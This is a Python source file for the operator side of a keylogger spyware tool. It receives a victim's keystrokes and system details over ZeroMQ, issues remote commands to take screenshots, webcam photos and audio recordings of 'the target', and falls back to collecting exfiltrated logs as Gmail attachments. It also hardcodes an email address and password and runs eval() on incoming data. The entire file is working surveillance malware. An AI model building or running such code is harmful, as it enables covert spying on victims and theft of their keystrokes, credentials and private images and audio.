import zmq
import threading, os, getpass, shutil, sys, platform
from datetime import datetime
from utils import write_file
from GUI import GUIWindow
import imaplib, email
import logging
import logging.config


stop_threads = False
gui_running = False
sys_name = platform.system().lower()

if sys_name == 'windows':
	temp_path = f"C:/Users/{getpass.getuser()}/AppData/Local/Temp/"
elif sys_name == 'linux' or sys_name == 'darwin':
	temp_path = "/tmp/"
else:
	print("Unknown system!\nExiting...")
	sys.exit(1)


logging.config.fileConfig('logging.conf')
logger = logging.getLogger('action')


class Communication:
	def __init__(self, ip_address, port_stream, port_interact):
		self.ip_address = ip_address
		self.port_stream = port_stream
		self.port_interact = port_interact


	def connect2stream(self):
		self.stream_context = zmq.Context()
		self.socket_stream = self.stream_context.socket(zmq.SUB)
		self.socket_stream.bind('tcp://' + self.ip_address + ':' + str(self.port_stream))
		self.socket_stream.subscribe('')

		if self.socket_stream.recv_string() != 'OK':
			raise Exception('Connection failed!')


	def connect2interaction(self):
		self.interact_context = zmq.Context()
		self.socket_interact = self.interact_context.socket(zmq.REQ)
		self.socket_interact.bind('tcp://' + self.ip_address + ':' + str(self.port_interact))


class KeyLogger(threading.Thread):	#zeromq
	def __init__(self, connection, gui, email_address, email_password):
		super(KeyLogger, self).__init__()

		self.email_address = email_address
		self.email_password = email_password
		self.imap_alias = 'imap.gmail.com'
		if isinstance(connection, Communication):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'Communication\' type!")
		if isinstance(gui, GUIWindow):
			self.gui = gui
		else:
			raise TypeError("\'gui\' parameter should be \'GUIWindow\' type!")


	def get_body(self, msg):
		if msg.is_multipart():
			return get_body(msg.get_payload(0))
		return msg.get_payload(None, True)


	def get_attachments(self, msg):
		for part in msg.walk():
			if part.get_content_maintype() == 'multipart':
				continue
			if part.get('Content-Disposition') is None:
				continue

			filename = part.get_filename()
			if bool(filename):
				with open(os.path.join(temp_path, filename), "wb") as handler:
					handler.write(part.get_payload(decode=True))


	def run(self):
		global stop_threads

		system_info = self.connection.socket_stream.recv_string()
		system_info = eval(system_info)

		path = '../logs/'
		filename = 'system_info.txt'

		if not os.path.isdir(path):
			os.mkdir(path=path)

		# writing system information into a file
		with open(os.path.join(path, filename), "w") as handler:
			handler.write("=" * 25 + " System Information " + "=" * 25 + "\n\n")
			handler.write(f"System: {system_info[0]['system']}\n")
			handler.write(f"Device name: {system_info[0]['device_name']}/{system_info[1][0]}\n")
			handler.write(f"User name: {system_info[1][1]}\n")
			handler.write(f"Release: {system_info[0]['release']}\n")
			handler.write(f"Version: {system_info[0]['version']}\n")
			handler.write(f"Architecture: {system_info[0]['architecture']}\n")
			handler.write(f"Processor: {system_info[0]['processor']}\n")
			handler.write(f"IP address: {system_info[1][2]}\n")

		filename = 'log.csv'

		while True:
			try:
				# data = [type, time, information]
				# type = <string> image, char, wcpic(webcam picture)
				# time = <string> current time when the key was pressed
				# information = <string> character pressed by the target
				data = self.connection.socket_stream.recv_string()
				data = eval(data)

				# data process
				if data[0] == "chars":
					write_file(os.path.join(path, filename), data[1:])
					if gui_running:
						self.gui.insert_data(data[1:])
				elif data[0] == 'close':
					self.connection.socket_stream.close()
					logger.info("Connection closed!\n")
					break

			except:
				stop_threads = True
				self.connection.socket_stream.close()
				self.connection.socket_interact.close()
				logger.info("\nClient closed the TCP connection.\nFrom now on communication will be via email if the process was not killed.\n")
				break

		stop_threads = True

		while True:
			try:
				# establish the connection with gmail service
				with imaplib.IMAP4_SSL(self.imap_alias) as imap_conn:
					imap_conn.login(self.email_address, self.email_password)

					# select from inbox tab the unseen emails
					imap_conn.select('INBOX')
					result, data = imap_conn.search(None, 'UnSeen')
					id_list = data[0].decode().split()

					if len(id_list) > 0:
						result, data = imap_conn.fetch(id_list[-1], '(RFC822)')
						if email.message_from_string(data[0][1].decode())['from'] == self.email_address:
							raw_message = email.message_from_bytes(data[0][1])

							logger.info('Downloading email attachments...')
							self.get_attachments(raw_message)
							logger.info('Done')

							if os.path.isfile(os.path.join(temp_path, filename)):
								with open(os.path.join(temp_path, filename), 'r') as reader:
									with open("../logs/log.csv", "a+") as writer:
										logger.info('Writing data into file...')
										for line in reader.readlines():
											writer.write(line)
											if gui_running:
												self.gui.insert_data(line.split(','))
										logger.info('Done')

							if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
								date_time = datetime.now().strftime("%d_%H_%M_%S")
								logger.info('Moving the screenshot into current folder...')
								shutil.move(os.path.join(temp_path, "screenshot.png"), f"./screenshot_{date_time}.png")
								logger.info('Done\n')
			except:
				logger.info("Something went wrong while processing email!")
				break


class MenuHandler(threading.Thread):
	def __init__(self, connection):
		super(MenuHandler, self).__init__()
		if isinstance(connection, Communication):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'Communication\' type!")


	def run(self):
		global stop_threads

		print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")

		while True:
			option = str(input(">>> "))

			# requests
			if option.lower() == 'help':
				print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")
			elif option == '1':
				logger.info('Taking screenshot...')
				try:
					self.connection.socket_interact.send_string(option)
				except:
					break
			elif option == '2':
				logger.info('Taking webcam picture...')
				try:
					self.connection.socket_interact.send_string(option)
				except:
					break
			elif option == '3':
				logger.info('Recording audio...')
				try:
					self.connection.socket_interact.send_string(option)
				except:
					break
			elif option == '4' or stop_threads:
				stop_threads = True
				logger.info("Closing the connection...")
				self.connection.socket_interact.send_string(option)
				break
			elif option == '':
				pass
			else:
				print("Wrong option!\n")

			# resposes
			if option in ['1', '2', '3']:
				data = self.connection.socket_interact.recv_string()
				data = eval(data)

				if data[0] == "image":
					if data[2] == 'Error':
						logger.info("Error while taking screenshot!")
					else:
						with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
							handler.write(data[2])
						logger.info('Done')
					prompt = True
				elif data[0] == "wcpic":
					if data[2] == 'Error':
						logger.info("Error while taking webcam picture!")
					else:
						with open(f'./webcam_{data[1]}.png', 'wb') as handler:
							handler.write(data[2])
						logger.info('Done')
					prompt = True
				elif data[0] == 'audio':
					if data[2] == 'Error':
						logger.info("Error while recording audio!")
					else:
						with open(f'./audio_{data[1]}.wav', 'wb') as handler:
							handler.write(data[2])
						logger.info('Done')


def main():
	global gui_running, stop_threads

	communication = Communication(ip_address='*', port_stream=10001, port_interact=10002)
	try:
		logger.info('Waiting for connection...')
		communication.connect2stream()
		communication.connect2interaction()
	except socket.error:
		print(socket.error)
		sys.exit(1)
	logger.info('Client connected!')

	gui = GUIWindow("KeyStrokeLogger")

	try:
		key_logger = KeyLogger(connection=communication, gui=gui, email_address='salamander.hck@gmail.com', email_password='0xzedff4343d2a')
		key_logger.start()

		menu = MenuHandler(connection=communication)
		menu.start()
	except TypeError as err:
		print(err)
		sys.exit(1)
	except Exception as err:
		logger.debug(err)
		sys.exit(1)

	gui_running = True
	try:
		gui.run()
	except:
		pass
	gui_running = False


if __name__ == '__main__':
	main()